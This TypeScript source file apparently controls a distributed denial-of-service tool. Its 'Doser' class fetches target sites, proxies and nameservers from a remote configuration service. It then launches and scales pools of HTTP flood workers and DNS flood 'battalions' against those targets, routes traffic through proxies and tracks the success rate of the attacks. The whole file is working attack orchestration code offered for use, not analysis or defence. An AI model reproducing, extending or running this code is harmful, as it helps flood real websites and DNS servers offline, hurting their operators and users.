import { AxiosError } from 'axios-https-proxy-fix'
import { EventEmitter } from 'events'
import {
  DoserEventType,
  ProxyData,
  SiteData,
  GetSitesAndProxiesResponse,
  PrioritizedTarget,
  NameserverData
} from './types'
import { Runner } from './runner'
import { ConfigurationService } from './services/configurationService'
import { Timeout } from './utils/timeout'
import { DnsBattalion } from './dnsBattalion'
import { AxiosProxyConfig } from 'axios'

const CONFIGURATION_WAIT_MIN_TIMEOUT = 10000 // 10 sec
const CONFIGURATION_WAIT_MAX_TIMEOUT = 120000 // 2 min

export class Doser {
  private onlyProxy: boolean
  private working: boolean
  private workers: Runner[] = []
  private dnsBattalions: DnsBattalion[] = []
  private numberOfWorkers = 0
  private activeDnsBattalionsNumber = 0
  private eventSource: EventEmitter
  private prioritizedPairs: PrioritizedTarget[] = []
  private dnsAttackPaused = false

  private verboseError: boolean
  private httpWorkersCapacity: number
  private dnsBattalionsCapacity: number
  private configurationService: ConfigurationService
  private dnsArmyResult = {
    attacks: 0,
    successful: 0,
    efficiency: '0%'
  }

  public sites: SiteData[] = []
  public proxies: ProxyData[] = []
  public maxPrioritizedWorkers = 0
  public prioritizedWorkersNow = 0
  private nameservers: NameserverData[] = []

  constructor (
    onlyProxy: boolean,
    numberOfHttpWorkers: number,
    numberOfDnsWorkers: number,
    verboseError: boolean
  ) {
    this.configurationService = new ConfigurationService()
    this.onlyProxy = onlyProxy
    this.working = false
    this.eventSource = new EventEmitter()
    this.httpWorkersCapacity = numberOfHttpWorkers
    this.dnsBattalionsCapacity = numberOfDnsWorkers
    this.verboseError = verboseError
    console.log(`Init doser. Http capacity: ${this.httpWorkersCapacity}. Dns capacity: ${this.dnsBattalionsCapacity}`)
    this.initialize(Timeout.zero())
  }

  getPrioritizedTargets () {
    return this.prioritizedPairs
  }

  removePrioritizedTarget (what: SiteData, proxy: AxiosProxyConfig | undefined) {
    for (let index = 0; index < this.prioritizedPairs.length; index++) {
      const element = this.prioritizedPairs[index]
      if (element.page === what && JSON.stringify(proxy) === JSON.stringify(element.proxyObj)) {
        this.prioritizedPairs.splice(index, 1)
        return
      }
    }
  }

  addPrioritizedTarget (what: SiteData, proxyObj: AxiosProxyConfig | undefined) {
    if (this.prioritizedPairs.length < this.maxPrioritizedWorkers) {
      this.prioritizedPairs.push({
        page: what,
        proxyObj: proxyObj
      }
      )
    }
  }

  private logError (message: string, cause: unknown) {
    console.log(message)

    if (this.verboseError) {
      console.log(cause)
    } else {
      console.log((cause as AxiosError)?.message)
    }
  }

  private initialize (timeout: Timeout, attemptNumber = 1) {
    // eslint-disable-next-line @typescript-eslint/no-misused-promises
    setTimeout(async () => {
      try {
        console.log('Initial pull config. Attempt ', attemptNumber, new Date())
        const config = await this.configurationService.pullConfiguration()
        this.updateConfiguration(config)
        this.listenForConfigurationUpdates(Timeout.fromValue(ConfigurationService.CONFIGURATION_INVALIDATION_TIME))
        this.startWorkers()
      } catch (e) {
        const newTimeout = timeout.increase(CONFIGURATION_WAIT_MIN_TIMEOUT, CONFIGURATION_WAIT_MAX_TIMEOUT)
        console.log('Can not pull configuration. Check after interval', newTimeout.interval)
        this.initialize(newTimeout, attemptNumber + 1)
      }
    }, timeout.interval)
  }

  forceProxy (newVal: boolean) {
    this.onlyProxy = newVal
    try {
      this.workers.forEach((worker, i) => {
        worker.setProxyActive(newVal)
        console.debug(`Changing runner proxy value ${i}..`)
      })
    } catch (err) {
      console.log(err)
    }
  }

  private updateConfiguration (configuration:GetSitesAndProxiesResponse) {
    this.sites = configuration.sites
    this.proxies = configuration.proxies
    this.nameservers = configuration.nameservers

    console.debug('CONFIGURATION UPDATED, REMOVING PRIORITIZED TARGETS')
    this.prioritizedPairs = []
    this.workers.forEach(worker => {
      worker.stopAddingPrioritized()
    })
    this.dnsBattalions.forEach(worker => {
      worker.updateConfiguration(this.nameservers)
    })

    if (this.nameservers.length === 0) {
      if (!this.dnsAttackPaused) {
        this.dnsAttackPaused = true
        this.stopDnsFloodArmy()
      }
    } else if (this.dnsAttackPaused) {
      this.startDnsFloodArmy()
      this.dnsAttackPaused = false
    }
  }

  private listenForConfigurationUpdates (timeout: Timeout) {
    // eslint-disable-next-line @typescript-eslint/no-misused-promises
    setTimeout(async () => {
      try {
        console.log('Try updating config', new Date())
        const config = await this.configurationService.pullConfiguration()
        this.updateConfiguration(config)
        /**
         * we don't start workers with old configuration
         * So it might happen that we have to start workers if configuration has been updated
         */
        this.startWorkers()
        this.listenForConfigurationUpdates(Timeout.fromValue(ConfigurationService.CONFIGURATION_INVALIDATION_TIME))
      } catch (e) {
        // todo: if old configuration we have to stop all workers
        const newTimeout = Timeout.fromValue(ConfigurationService.CONFIGURATION_INVALIDATION_TIME / 2)
        console.log('Can not pull configuration. Check after interval', newTimeout.interval)
        this.listenForConfigurationUpdates(newTimeout)
      }
    }, timeout.interval)
  }

  private startWorkers () {
    this.startHttpWorkers()
    this.startDnsWorkers()
  }

  private startHttpWorkers () {
    this.maxPrioritizedWorkers = Math.floor(this.httpWorkersCapacity / 1.33)
    if (this.httpWorkersCapacity === this.numberOfWorkers) {
      return
    }
    console.debug(`Updating workers count to ${this.numberOfWorkers} => ${this.httpWorkersCapacity}`)
    if (this.httpWorkersCapacity < this.numberOfWorkers) {
      for (let i = this.numberOfWorkers; i >= this.httpWorkersCapacity; i--) {
        this.workers[i]?.eventSource.removeAllListeners()
        this.workers[i]?.stop()
      }
      this.workers = this.workers.slice(0, this.httpWorkersCapacity)
    } else {
      // we don't want to spawn new workers with old configuration
      if (this.configurationService.expired()) {
        console.log('Can not start due to deprecated configuration')
        return
      }
      while (this.workers.length < this.httpWorkersCapacity) {
        const newWorker = this.createNewWorker()
        this.workers.push(newWorker)
        if (this.working) {
          newWorker.start().catch(error => {
            console.debug('Wasnt able to start new runner:', error)
          })
        }
      }
    }
    this.numberOfWorkers = this.httpWorkersCapacity
  }

  private startDnsWorkers () {
    if (this.dnsBattalionsCapacity === this.activeDnsBattalionsNumber) {
      return
    }
    console.debug(`Updating dns army ${this.numberOfWorkers} => ${this.httpWorkersCapacity}`)
    if (this.dnsBattalionsCapacity < this.activeDnsBattalionsNumber) {
      this.dnsBattalions = this.dnsBattalions.slice(0, this.dnsBattalionsCapacity)
      for (const battalion of this.dnsBattalions.slice(this.dnsBattalionsCapacity)) {
        battalion.stop()
      }
    } else {
      // we don't want to spawn new workers with old configuration
      if (this.configurationService.expired()) {
        console.log('Can not start due to deprecated configuration')
        return
      }
      while (this.dnsBattalions.length < this.dnsBattalionsCapacity) {
        this.dnsBattalions.push(this.createDnsBattalion())
      }
      if (this.working) {
        this.startDnsFloodArmy()
      }
    }
    this.activeDnsBattalionsNumber = this.dnsBattalionsCapacity
  }

  start () {
    this.working = true
    this.workers.forEach((worker, i) => {
      console.debug(`Starting runner ${i}..`)
      worker.start().catch(error => {
        console.error(`Wasnt able to start worker #${i} - `, error)
      })
    })
    this.startDnsFloodArmy()
  }

  stop () {
    this.working = false
    this.workers.forEach((worker, i) => {
      console.debug(`Stopping runner ${i}..`)
      worker.stop()
    })
    this.stopDnsFloodArmy()
  }

  private createNewWorker (): Runner {
    console.debug('Creating new worker..')
    // Should never happen
    if (!this.sites || !this.proxies) {
      throw new Error('Cannot create worker without configuration')
    }
    const worker = new Runner({
      onlyProxy: this.onlyProxy,
      doserInstance: this
    })
    worker.eventSource.on('attack', event => {
      this.eventSource.emit('atack', {
        type: 'atack',
        ...event
      })
    })

    worker.eventSource.on('error', event => {
      if (this.verboseError) {
        this.eventSource.emit('error', event)
      }
    })
    return worker
  }

  private createDnsBattalion (): DnsBattalion {
    console.debug('Creating dns battalion...')
    return new DnsBattalion(this.nameservers)
  }

  listen (event: DoserEventType, callback: (data: any) => void) {
    this.eventSource.addListener(event, callback)
  }

  updateCapacity (numberOfWorkers: number) {
    this.httpWorkersCapacity = numberOfWorkers
    this.startWorkers()
  }

  private stopDnsFloodArmy () {
    this.dnsBattalions.forEach(battalions => {
      battalions.stop()
    })
  }

  private startDnsFloodArmy () {
    this.dnsBattalions.forEach(battalions => {
      battalions.on('attack', event => {
        this.dnsArmyResult.attacks++
        // eslint-disable-next-line @typescript-eslint/no-unsafe-member-access
        if (event.successful) {
          this.dnsArmyResult.successful++
        }
        this.dnsArmyResult.efficiency = (this.dnsArmyResult.successful / this.dnsArmyResult.attacks * 100).toFixed(2) + '%'
        console.log(this.dnsArmyResult)
      })
      battalions.start().catch(error => {
        // eslint-disable-next-line @typescript-eslint/no-unsafe-member-access
        console.debug('Wasnt able to start new runner:', error.message)
      })
    })
  }
}
